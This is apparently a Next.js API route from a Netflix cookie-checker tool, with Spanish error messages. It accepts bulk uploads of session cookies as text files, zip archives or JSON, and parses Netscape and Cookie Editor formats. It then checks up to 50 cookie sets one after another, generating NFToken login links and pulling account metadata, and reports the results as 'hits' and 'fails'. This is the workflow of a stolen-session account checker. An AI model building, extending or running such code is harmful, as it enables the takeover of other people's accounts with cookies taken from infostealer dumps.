import { NextRequest, NextResponse } from "next/server";
import AdmZip from "adm-zip";
import {
  extractCookiesFromText,
  checkCookie,
  getMetadata,
  buildCookieString,
} from "@/lib/netflix-checker";
import type { CheckResult, NFTokenResult, NetflixMetadata } from "@/lib/netflix-checker";

interface BatchResult extends CheckResult {
  index: number;
  rawCookie: string;
}

async function processCookie(
  rawCookie: string,
  index: number
): Promise<BatchResult> {
  const cookieDict = extractCookiesFromText(rawCookie);

  if (!cookieDict || Object.keys(cookieDict).length === 0) {
    return {
      index,
      rawCookie,
      success: false,
      error: "No se pudieron extraer cookies del texto",
    };
  }

  // Step 1: Check NFToken
  const tokenResult: NFTokenResult = await checkCookie(cookieDict);

  if (!tokenResult.success) {
    return {
      index,
      rawCookie,
      success: false,
      error: tokenResult.error || "Error al generar NFToken",
    };
  }

  // Step 2: Get metadata (non-critical)
  let metadata: NetflixMetadata = {};
  try {
    metadata = await getMetadata(cookieDict);
  } catch {
    // Non-critical failure
  }

  return {
    index,
    rawCookie,
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  };
}

/** Parse Netscape cookie file → returns list of cookie dictionaries (each with NetflixId+SecureNetflixId+nfvdid) */
function parseNetscapeMulti(content: string): Record<string, string>[] {
  const results: Record<string, string>[] = [];
  let current: Record<string, string> = {};

  const lines = content.split("\n");
  for (const rawLine of lines) {
    const line = rawLine.trim();
    if (!line || line.startsWith("#")) {
      // Blank line or comment = boundary between cookies
      if (Object.keys(current).length > 0) {
        results.push(current);
        current = {};
      }
      continue;
    }

    const parts = line.split("\t");
    if (parts.length >= 7) {
      const name = parts[5].trim();
      const value = parts[6].trim();
      if (name) current[name] = value;

      // When we have the 3 required cookies, save this set
      if (current["NetflixId"] && current["SecureNetflixId"] && current["nfvdid"]) {
        results.push(current);
        current = {};
      }
    }
  }

  // Don't forget last one
  if (Object.keys(current).length > 0) results.push(current);
  return results;
}

/** Try to extract cookies from any text format, returns array of cookie strings */
function extractAllCookies(content: string): string[] {
  const results: string[] = [];

  // 1. Try JSON format (Cookie Editor)
  const trimmed = content.trim();
  if (trimmed.startsWith("[") || trimmed.startsWith("{")) {
    const dict = extractCookiesFromText(trimmed);
    if (dict && (dict["NetflixId"] || dict["SecureNetflixId"])) {
      results.push(trimmed);
      return results;
    }
  }

  // 2. Try Netscape format (multi-cookie file)
  if (trimmed.includes("\t")) {
    const netscapeCookies = parseNetscapeMulti(trimmed);
    for (const cookie of netscapeCookies) {
      const str = buildCookieString(cookie);
      results.push(str);
    }
    if (results.length > 0) return results;
  }

  // 3. Split by blank lines and try each block
  const blocks = content.split(/\n\s*\n/);
  for (const block of blocks) {
    const t = block.trim();
    if (!t || t.length < 10 || t.startsWith("#") || t.startsWith("---")) continue;

    const dict = extractCookiesFromText(t);
    if (dict && (dict["NetflixId"] || dict["SecureNetflixId"] || dict["nfvdid"])) {
      results.push(t);
      continue;
    }

    // Try line by line within block
    const lines = t.split("\n").map(l => l.trim()).filter(l => l.length > 10);
    for (const line of lines) {
      const ld = extractCookiesFromText(line);
      if (ld && (ld["NetflixId"] || ld["SecureNetflixId"] || ld["nfvdid"])) {
        results.push(line);
      }
    }
  }

  return results;
}

/** Extract cookie strings from a .txt file content */
function parseTxtFile(content: string): string[] {
  if (!content || !content.trim()) return [];
  return extractAllCookies(content);
}

/** Extract cookie strings from a .zip file — reads ALL files inside */
function parseZipFile(buffer: Buffer): string[] {
  const allCookies: string[] = [];
  let zip: AdmZip;

  try {
    zip = new AdmZip(buffer);
  } catch (err) {
    console.error("Error opening ZIP:", err);
    return allCookies;
  }

  const entries = zip.getEntries();

  for (const entry of entries) {
    if (entry.isDirectory) continue;
    if (entry.entryName.startsWith("__MACOSX")) continue;
    if (entry.entryName.endsWith(".DS_Store")) continue;

    try {
      const content = entry.getData().toString("utf-8");
      const cookies = extractAllCookies(content);
      if (cookies.length > 0) {
        console.log(`ZIP: ${entry.entryName} → ${cookies.length} cookie(s)`);
        allCookies.push(...cookies);
      }
    } catch (err) {
      console.error(`Error leyendo ${entry.entryName}:`, err);
    }
  }

  return allCookies;
}

export async function POST(request: NextRequest) {
  try {
    const contentType = request.headers.get("content-type") || "";

    let cookieTexts: string[] = [];

    if (contentType.includes("multipart/form-data")) {
      // Handle file upload
      const formData = await request.formData();
      const file = formData.get("file") as File | null;

      if (!file) {
        // Check if cookies array was sent
        const cookiesRaw = formData.get("cookies");
        if (cookiesRaw) {
          try {
            const parsed = JSON.parse(cookiesRaw as string);
            cookieTexts = Array.isArray(parsed) ? parsed : [cookiesRaw as string];
          } catch {
            cookieTexts = [cookiesRaw as string];
          }
        } else {
          return NextResponse.json(
            { success: false, error: "No se proporcionó archivo ni cookies" },
            { status: 400 }
          );
        }
      } else {
        const buffer = Buffer.from(await file.arrayBuffer());

        if (file.name.endsWith(".zip")) {
          cookieTexts = parseZipFile(buffer);
        } else {
          // .txt file
          const content = buffer.toString("utf-8");
          cookieTexts = parseTxtFile(content);
        }
      }
    } else {
      // Handle JSON body
      const body = await request.json();
      const { cookies } = body;

      if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
        return NextResponse.json(
          { success: false, error: "Se requiere un array de cookies" },
          { status: 400 }
        );
      }

      cookieTexts = cookies;
    }

    if (cookieTexts.length === 0) {
      return NextResponse.json(
        { success: false, error: "No se encontraron cookies válidas en el archivo" },
        { status: 400 }
      );
    }

    // Limit batch size
    const MAX_BATCH = 50;
    if (cookieTexts.length > MAX_BATCH) {
      cookieTexts = cookieTexts.slice(0, MAX_BATCH);
    }

    // Process cookies sequentially (to avoid rate limiting)
    const results: BatchResult[] = [];
    for (let i = 0; i < cookieTexts.length; i++) {
      const result = await processCookie(cookieTexts[i], i);
      results.push(result);
    }

    const hits = results.filter((r) => r.success).length;
    const fails = results.filter((r) => !r.success).length;

    return NextResponse.json({
      results,
      stats: {
        total: results.length,
        hits,
        fails,
      },
    });
  } catch (err: any) {
    console.error("Batch check error:", err);
    return NextResponse.json(
      {
        success: false,
        error: `Error del servidor: ${err.message || "Desconocido"}`,
      },
      { status: 500 }
    );
  }
}
